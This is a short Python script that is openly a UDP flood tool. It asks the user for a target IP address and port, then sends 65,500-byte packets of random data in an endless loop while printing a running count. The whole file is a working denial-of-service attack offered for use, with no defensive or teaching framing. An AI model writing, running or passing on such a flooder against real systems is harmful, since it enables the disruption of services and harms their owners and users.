import socket
import random
import time

#IP address to attack
ip = input("Enter the IP address to attack: ")
#port to attack
port = input("Enter the port to attack: ")

#creating socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#Sending data to target
bytes = random._urandom(65500)

#Sending attack
sent = 0
while True:
	sock.sendto(bytes, (ip, int(port)))
	sent = sent + 1
	print("Sent %s packet to %s throught port %s"%(sent,ip,port))